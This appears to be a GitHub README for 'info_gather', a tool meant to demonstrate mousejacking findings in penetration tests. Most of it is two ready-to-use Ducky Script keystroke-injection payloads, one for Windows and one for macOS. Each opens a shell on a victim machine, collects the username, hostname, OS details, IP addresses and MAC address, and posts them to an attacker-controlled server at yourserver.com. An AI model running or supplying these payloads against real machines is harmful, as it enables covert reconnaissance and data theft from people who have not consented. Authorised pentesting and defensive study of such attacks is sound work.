# info_gather
Gather Windows Info for POC. A good use case is a POC for mousejacking finding on a pentest report.

Run the server and any port using:

```
python3 info_gather.py 80
```

For a victim Windows machine use this Ducky Script to send the info to the server host:

```
DELAY 2000
GUI r
DELAY 500
STRING powershell.exe
DELAY 500
ENTER
DELAY 500
STRING $username = $env:username;$hostname = hostname;$os = (Get-CimInstance Win32_OperatingSystem).Caption;$public_ip = (Invoke-WebRequest -Uri 'http://ipinfo.io/ip').Content.Trim();$data = @{'username' = $username;'hostname' = $hostname;'os' = $os;'public_ip' = $public_ip};$json = $data | ConvertTo-Json;Invoke-RestMethod -Method Post -Uri "http://yourserver.com" -Body $json -ContentType "application/json"
DELAY 500
ENTER
```


For a victim MacOS machine, use this Ducky Script to send the info to the server host:
```
DELAY 2000
COMMAND SPACE  // Opens Spotlight Search
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRING username=$(whoami);hostname=$(scutil --get ComputerName);os=$(sw_vers -productName);os_version=$(sw_vers -productVersion);kernel_version=$(uname -r);public_ip=$(curl -s ifconfig.me);local_ip=$(ipconfig getifaddr en0);mac_address=$(ifconfig en0 | grep ether | awk '{print $2}');uptime=$(uptime | awk '{print $3,$4}' | sed 's/,//');data="{\"username\":\"$username\",\"hostname\":\"$hostname\",\"os\":\"$os\",\"os_version\":\"$os_version\",\"kernel_version\":\"$kernel_version\",\"public_ip\":\"$public_ip\",\"local_ip\":\"$local_ip\",\"mac_address\":\"$mac_address\",\"uptime\":\"$uptime\"}";curl -X POST -H "Content-Type: application/json" -d "$data" http://yourserver.com
DELAY 500
ENTER
```
